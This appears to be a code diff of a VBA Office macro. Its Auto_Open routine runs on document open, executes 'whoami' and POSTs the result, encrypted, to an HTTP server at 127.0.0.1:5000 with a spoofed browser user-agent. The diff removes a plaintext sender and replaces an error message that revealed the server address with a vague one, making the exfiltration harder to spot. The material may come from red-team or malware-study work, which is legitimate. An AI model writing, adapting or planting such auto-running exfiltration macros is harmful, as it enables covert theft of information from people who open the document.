@@ -15,26 +15,6 @@ Done:
 error:
         RunCommand = "ERROR"
 End Function
-Function SendToServer(data As String)
-    
-    On Error GoTo error
-    
-    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-    
-    URL = "http://127.0.0.1:5000"
-    
-    objHTTP.Open "POST", URL, False
-    
-    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
-    
-    objHTTP.send (data)
-    
-Done:
-    Exit Function
-    
-error:
-        MsgBox ("Could not connect to http://127.0.0.1:5000")
-End Function
 Public Function encrypt(s As String, v As Long) As String
     Dim total As String
     Dim tmp As String
@@ -66,13 +46,13 @@ Function SendToServerEnc(data As String)
 Done:
     Exit Function
 error:
-        MsgBox ("Could not connect to http://127.0.0.1:5000/enc")
+        MsgBox ("Connection failed")
 End Function
 Sub Auto_Open()
     Dim newString As String
     Dim strOutput As String
     
-    strOutput = RunCommand("ping 8.8.8.8")
+    strOutput = RunCommand("whoami")
     SendToServerEnc (strOutput)
     
 End Sub
